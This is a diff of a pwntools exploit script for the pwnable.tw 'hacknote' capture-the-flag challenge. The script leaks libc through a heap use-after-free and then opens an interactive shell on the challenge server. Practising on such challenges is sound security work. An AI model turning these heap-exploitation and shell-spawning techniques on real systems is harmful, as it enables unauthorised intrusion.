@@ -13,17 +13,15 @@ if sys.argv[1] == "l":
     io = process("./hacknote")
     elf = ELF("./hacknote")
     libc = ELF("/lib/i386-linux-gnu/libc.so.6")
-    one_gadget_offset = 0x3a9fc
 
 else:
     io = remote("chall.pwnable.tw", 10102)
     elf = ELF("./hacknote")
     libc = ELF("./libc_32.so.6")
-    one_gadget_offset = 0x3a819
 
 def DEBUG():
     raw_input("DEBUG: ")
-    payload = '''
+    cmd = '''
     b *0x804869A
     b *0x804872C
     b *0x80487D3
@@ -31,12 +29,12 @@ def DEBUG():
     b *0x8048879
     b *0x804893D
     '''
-    gdb.attach(io, payload)
+    gdb.attach(io, cmd)
 
 def addNote(size, content):
     io.sendlineafter("choice :", "1")
     io.sendlineafter("size :", str(size))
-    io.sendlineafter("Content :", content)
+    io.sendafter("Content :", content)
 
 def delNote(idx):
     io.sendlineafter("choice :", "2")
@@ -48,9 +46,9 @@ def printNote(idx):
     io.sendlineafter("Index :", str(idx))
 
 def leak():
-    addNote(24, 'aaa')
-    addNote(24, 'bbb')
-
+    addNote(24, 'a' * 24)
+    addNote(24, 'b' * 24)
+ 
     delNote(0)
     delNote(1)
 
@@ -59,10 +57,8 @@ def leak():
     printNote(0)
     libc_base = u32(io.recvuntil("\xf7")[-4: ]) - libc.symbols["puts"]
     info("libc_base -> 0x%x" % libc_base)
-    #  return libc_base + one_gadget_offset
     return libc_base
 
-#  def shell(one_gadget):
 def shell(libc_base):
     addNote(40, 'ccc')
 
@@ -81,4 +77,3 @@ if __name__ == "__main__":
     shell(leak())
     io.interactive()
     io.close()
-
